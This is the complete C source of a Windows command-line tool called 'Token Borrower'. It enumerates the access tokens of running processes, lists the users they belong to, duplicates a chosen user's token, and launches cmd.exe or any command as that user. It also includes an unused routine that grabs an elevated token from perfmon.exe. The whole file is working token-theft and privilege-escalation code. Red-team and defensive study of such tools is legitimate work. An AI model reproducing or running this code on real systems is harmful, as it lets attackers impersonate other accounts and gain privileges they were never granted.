#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

// lmcons.h
// Max username length
#define UNLEN 256

#define MAX_COMMAND_LINE 1024

DWORD dwLastError = 0;

BOOL ARG_LIST_TOKENS  = FALSE;
BOOL ARG_BORROW_TOKEN = FALSE;
BOOL ARG_CUSTOM_EXEC  = FALSE;
BOOL ARG_VERBOSE      = FALSE;

// DownLevel - Down Level Logon Name - Domain\Username
char TokenDownLevel[MAX_COMPUTERNAME_LENGTH + UNLEN + 1];
char BorrowDownLevel[MAX_COMPUTERNAME_LENGTH + UNLEN + 1];

char tmpExecuteCommand[MAX_COMMAND_LINE + 1];
wchar_t ExecuteCommand[MAX_COMMAND_LINE + 1] = L"cmd.exe";

DWORD dwProcessesCaptured = 0;
DWORD dwHighestPrivilegeCount = 0;
HANDLE hBorrowToken = INVALID_HANDLE_VALUE;

DWORD GetTokenPrivileges(HANDLE hToken, PDWORD dwHasSeImpersonate, char *Domain){
    PTOKEN_PRIVILEGES pTokenPrivilegeInformation = NULL;
    DWORD dwSizeTokenPrivileges = 0;
    DWORD dwPrivilegeCount = 0;
    
    char *privName = NULL;
    DWORD dwSizePrivName = 0;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSizeTokenPrivileges);
    pTokenPrivilegeInformation = malloc(dwSizeTokenPrivileges);

    GetTokenInformation(hToken, TokenPrivileges, pTokenPrivilegeInformation, dwSizeTokenPrivileges, &dwSizeTokenPrivileges);
    dwPrivilegeCount = pTokenPrivilegeInformation->PrivilegeCount;
    
    if(dwPrivilegeCount == 0 && ARG_VERBOSE){
        printf(" [*] No privileges found.\n");
        printf("\n");
    } else {
        for(int i = 0; i < pTokenPrivilegeInformation->PrivilegeCount; i++){
            LookupPrivilegeNameA(Domain, &pTokenPrivilegeInformation->Privileges[i].Luid, privName, &dwSizePrivName);
            privName = (char *)malloc(dwSizePrivName * sizeof(TCHAR));
        
            LookupPrivilegeNameA(Domain, &pTokenPrivilegeInformation->Privileges[i].Luid, privName, &dwSizePrivName);
            
            dwSizePrivName = 0;
            
            if(ARG_VERBOSE){
                printf(" [*] %s\n", privName);
                if(i+1 == dwPrivilegeCount){
                    printf("\n");
                }
            }
            if(strcmp(privName, "SeImpersonatePrivilege") == 0){
                *dwHasSeImpersonate = 1;
            }
        }
    }
    
    free(pTokenPrivilegeInformation);
    pTokenPrivilegeInformation = NULL;
    free(privName);
    privName = NULL;

    return dwPrivilegeCount;
}

void GetTokenDownLevelLogon(HANDLE hToken){
    SID_NAME_USE SidType;
    DWORD dwSizeTokenUser = 0;
    PTOKEN_USER pTokenUserInformation = NULL;

    char  Username[UNLEN+1];
    char  DomainName[MAX_COMPUTERNAME_LENGTH+1];
    DWORD dwSizeName = sizeof(Username);
    DWORD dwSizeDomainName = sizeof(DomainName);

    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSizeTokenUser);
    pTokenUserInformation = malloc(dwSizeTokenUser);

    GetTokenInformation(hToken, TokenUser, pTokenUserInformation,      dwSizeTokenUser,      &dwSizeTokenUser);
    LookupAccountSidA(NULL, pTokenUserInformation->User.Sid, Username, &dwSizeName, DomainName, &dwSizeDomainName, &SidType);
    sprintf(TokenDownLevel, "%s%s%s", DomainName, "\\", Username);

    free(pTokenUserInformation);
    pTokenUserInformation = NULL;
    return;
}

// Unused - For now.
HANDLE CreateElevatedToken(){
    HANDLE hToken = INVALID_HANDLE_VALUE;
    HANDLE hElevatedToken = INVALID_HANDLE_VALUE;

    SHELLEXECUTEINFOA se;
    ZeroMemory(&se, sizeof(se));
    se.cbSize = sizeof(se);
    se.fMask = SEE_MASK_NOCLOSEPROCESS;

    se.lpFile = "C:\\Windows\\System32\\perfmon.exe"; // Always-elevated process.
    se.lpParameters = "/res";                         //    Resource Monitor.

    se.nShow = SW_HIDE;
    
    ShellExecuteExA(&se);

    if(!OpenProcessToken(se.hProcess, TOKEN_DUPLICATE, &hToken)){
        printf("[!] Failed to open elevated token.\n");
        return INVALID_HANDLE_VALUE;
    }

    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hElevatedToken)){
        printf("[!] Failed to duplicate elevated token.\n");
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hToken);
    TerminateProcess(se.hProcess, 0);

    return hElevatedToken;
}

BOOL CheckLoggedTokens(char **NameArray, char *TokenDownLevel){
     for(int i = 0; i < dwProcessesCaptured; i++){
        if(strcmp(NameArray[i], TokenDownLevel) == 0){
                return TRUE;
        }
    }
    return FALSE;
}

BOOL LogTokenName(char **NameArray, char *TokenDownLevel, DWORD *dwLogCounter){
    if(CheckLoggedTokens(NameArray, TokenDownLevel)){
        return FALSE;
    } else {
        strcpy(NameArray[*dwLogCounter], TokenDownLevel);
        (*dwLogCounter)++;
        return TRUE;
    }
}

BOOL Impersonate(HANDLE hToken, char *TokenDownLevel){
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi;

    si.cb = sizeof(si);

    if(!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, ExecuteCommand, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)){
        dwLastError = GetLastError();
        printf("\n[!] Failed to create process \"%ls\" as %s.\n", ExecuteCommand, BorrowDownLevel);
    } else {
        printf("\n[+] Successfully executed \"%ls\" as %s.\n", ExecuteCommand, BorrowDownLevel);
    }
}

BOOL IdentifyTokens(HANDLE hSnapshot, PROCESSENTRY32 proc32, DWORD dwProcessesCaptured){
    
    HANDLE hProc  = INVALID_HANDLE_VALUE;
    HANDLE hToken = INVALID_HANDLE_VALUE;

    PTOKEN_TYPE       pTokenTypeInformation      = NULL;
    PTOKEN_ELEVATION  pTokenElevationInformation = NULL;

    DWORD dwPrimaryNamesLogged       = 0;
    DWORD dwImpersonationNamesLogged = 0;

    DWORD dwCurrentTokenPrivCount = 0;
    DWORD dwHasSeImpersonate      = 0;

    // Will be initialized to correct value later.
    DWORD dwSizeTokenType       = 0;
    DWORD dwSizeTokenElevation  = 0;

    char Domain[MAX_COMPUTERNAME_LENGTH + UNLEN + 1];

    char **ImpersonationArray = malloc(dwProcessesCaptured * sizeof(char *));
    for (int i = 0; i < dwProcessesCaptured; i++){
        ImpersonationArray[i] = malloc((MAX_COMPUTERNAME_LENGTH + UNLEN + 1) * sizeof(char));
    }

    char **PrimaryArray = malloc(dwProcessesCaptured * sizeof(char *));
    for (int i = 0; i < dwProcessesCaptured; i++){
        PrimaryArray[i] = malloc((MAX_COMPUTERNAME_LENGTH + UNLEN + 1) * sizeof(char));
    }

    // Jump to the first process in the snapshot for parsing.
    Process32First(hSnapshot, &proc32);
    do {
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc32.th32ProcessID);
        if(OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)){

            GetTokenInformation(hToken, TokenType,      NULL, 0, &dwSizeTokenType);
            GetTokenInformation(hToken, TokenElevation, NULL, 0, &dwSizeTokenElevation);

            pTokenTypeInformation      = (PTOKEN_TYPE)      malloc(dwSizeTokenType);
            pTokenElevationInformation = (PTOKEN_ELEVATION) malloc(dwSizeTokenElevation);
            
            GetTokenInformation(hToken, TokenType,      pTokenTypeInformation,      dwSizeTokenType,      &dwSizeTokenType);
            GetTokenInformation(hToken, TokenElevation, pTokenElevationInformation, dwSizeTokenElevation, &dwSizeTokenElevation);

            GetTokenDownLevelLogon(hToken);

            if(ARG_VERBOSE){
                printf("[*] Token found in PID %i (%s)\n", proc32.th32ProcessID, proc32.szExeFile);
                if(pTokenElevationInformation->TokenIsElevated){
                    printf("[*] Process is elevated.\n");
                }
                printf("[*] Running as: %s\n", TokenDownLevel);
            }

            strcpy(Domain, TokenDownLevel);
            strtok(Domain, "\\");

            if(strcmp(Domain, "NT AUTHORITY") == 0 || strcmp(Domain, "Font Driver Host") == 0 || strcmp(Domain, "Window Manager") == 0){
                strcpy(Domain, "");
            }

            dwCurrentTokenPrivCount = GetTokenPrivileges(hToken, &dwHasSeImpersonate, Domain);

            if (*(PTOKEN_TYPE)pTokenTypeInformation == TokenImpersonation){
                LogTokenName(ImpersonationArray, TokenDownLevel, &dwImpersonationNamesLogged);
                if(ARG_BORROW_TOKEN){
                    if(strcmp(TokenDownLevel, BorrowDownLevel) == 0 && dwHighestPrivilegeCount < dwCurrentTokenPrivCount){
                        dwHighestPrivilegeCount = dwCurrentTokenPrivCount;
                        DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hBorrowToken);
                    }
                }
            }
            if(*(PTOKEN_TYPE)pTokenTypeInformation == TokenPrimary){
                LogTokenName(PrimaryArray, TokenDownLevel, &dwPrimaryNamesLogged);
                if(ARG_BORROW_TOKEN){
                    if(strcmp(TokenDownLevel, BorrowDownLevel) == 0 && dwHighestPrivilegeCount < dwCurrentTokenPrivCount){
                        dwHighestPrivilegeCount = dwCurrentTokenPrivCount;
                        DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hBorrowToken);
                    }
                }
            }
        }
        free(pTokenElevationInformation);
        pTokenElevationInformation = NULL;
        free(pTokenTypeInformation);      
        pTokenTypeInformation = NULL;

        CloseHandle(hToken);
        CloseHandle(hProc);

    } while(Process32Next(hSnapshot, &proc32));
    CloseHandle(hSnapshot);
    
    if(ARG_BORROW_TOKEN){
        if(hBorrowToken == INVALID_HANDLE_VALUE){
        printf("\n[!] Failed to open a handle to token \"%s\".\n", BorrowDownLevel);
        return -1;
        } else {
            Impersonate(hBorrowToken, TokenDownLevel);
        }
    }

    if(ARG_LIST_TOKENS){
        if(dwPrimaryNamesLogged){
            printf("\n-=-=-=- Primary Tokens -=-=-=-\n");
            for(int i = 0; i < dwPrimaryNamesLogged; i++){
                    printf("%s\n", PrimaryArray[i]);
            }
        }
        if(dwImpersonationNamesLogged){
            printf("\n-=-=-=- Impersonation Tokens -=-=-=-\n");
            for(int i = 0; i < dwImpersonationNamesLogged; i++){
                    printf("%s\n", ImpersonationArray[i]);
            }
        }
    }
    free(PrimaryArray);
    PrimaryArray = NULL;
    free(ImpersonationArray);
    ImpersonationArray = NULL;
    return 0;
}

void Banner(void){
    // https://patorjk.com/software/taag/
    printf(" _____     _               ______                                                \n");
    printf("|_   _|   | |              | ___ \\                                              \n");
    printf("  | | ___ | | _____ _ __   | |_/ / ___  _ __ _ __ _____      _____ _ __          \n");
    printf("  | |/ _ \\| |/ / _ \\ '_ \\  | ___ \\/ _ \\| '__| '__/ _ \\ \\ /\\ / / _ \\ '__|\n");
    printf("  | | (_) |   <  __/ | | | | |_/ / (_) | |  | | | (_) \\ V  V /  __/ |           \n");
    printf("  \\_/\\___/|_|\\_\\___|_| |_| \\____/ \\___/|_|  |_|  \\___/ \\_/\\_/ \\___|_|  \n");
    printf(" -----------------------------------------------------------------------         \n");
    printf("                       Because stealing is wrong.                                \n");
    printf(" -----------------------------------------------------------------------         \n");
    printf("           SeDebugPrivilege required to see elevated processes.                  \n");
    printf("          SeImpersonatePrivilege required to borrow their tokens.                \n");
}   

void Usage(void){
    printf("Usage:\n\n");
    printf("-h             - Display this message.                                           \n");
    printf("-l             - List available tokens.                                          \n");
    printf("-b Domain\\Name - Borrow Domain\\Name's token for execution (DEFAULT: cmd.exe).  \n");
    printf("-e Command     - Execute \"Command\" as Domain\\Name.                            \n");
    printf("-v             - Enable (very) verbose output.                                   \n");
    printf("\n");
}

int main(int argc, char *argv[]){
    Banner();
    if(argc == 1){
        Usage();
        return -1;
    }

    // Argument parsing.
    for(int i = 0; i < argc; i++){
        switch(argv[i][0]){
            case '-':
                switch(argv[i][1]){
                    case 'h':
                        Usage();
                        break;
                    case 'l':
                        ARG_LIST_TOKENS = TRUE;
                        break;
                    case 'b':
                        if(i+1 < argc){
                            ARG_BORROW_TOKEN = TRUE;
                            strncpy(BorrowDownLevel, argv[i+1], sizeof(BorrowDownLevel));
                            break;
                        } else {
                            printf("Missing argument for -b.\n\n");
                            return -1;
                        }
                    case 'e':
                        if(i+1 < argc){
                            ARG_CUSTOM_EXEC = TRUE;
                            strncpy(tmpExecuteCommand, argv[i+1], sizeof(tmpExecuteCommand));
                            break;
                        }
                    case 'v':
                        ARG_VERBOSE = TRUE;
                        break;
                }
        }
    }
    if(ARG_VERBOSE && !(ARG_LIST_TOKENS || ARG_BORROW_TOKEN)){
        Usage();
        return 0;
    }

    if(ARG_CUSTOM_EXEC){
        if(!ARG_BORROW_TOKEN){
            printf("\n[!] You must borrow a token in order to execute a command.\n\n");
        }   
        MultiByteToWideChar(CP_UTF8, 0, tmpExecuteCommand, -1, ExecuteCommand, sizeof(ExecuteCommand));
    }

    if(ARG_LIST_TOKENS || ARG_BORROW_TOKEN){
        
        if(ARG_BORROW_TOKEN){
            DWORD dwHasSeImpersonate = 0;
            char *Domain = NULL;

            GetTokenDownLevelLogon(GetCurrentProcessToken());
            Domain = strtok(TokenDownLevel, "\\");

            GetTokenPrivileges(GetCurrentProcessToken(), &dwHasSeImpersonate, Domain);
            if(!dwHasSeImpersonate){
                printf("\n[!] Current user does not has SeImpersonatePrivilege, no borrowing permitted.\n");
                return -1;
            }
        }
        PROCESSENTRY32 proc32;
        HANDLE hSnapshot = INVALID_HANDLE_VALUE;

        proc32.dwSize = sizeof(PROCESSENTRY32);

        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE){
            puts("\n[!] Failed to open a handle to snapshot.");
            return -1;
        }

        if (!Process32First(hSnapshot, &proc32)){
            CloseHandle(hSnapshot);
            puts("\n[!] No processes found in snapshot.");
            return -1;
        }

        do {
            dwProcessesCaptured++;
        } while(Process32Next(hSnapshot, &proc32));

        IdentifyTokens(hSnapshot, proc32, dwProcessesCaptured);
    }
    return 0;
}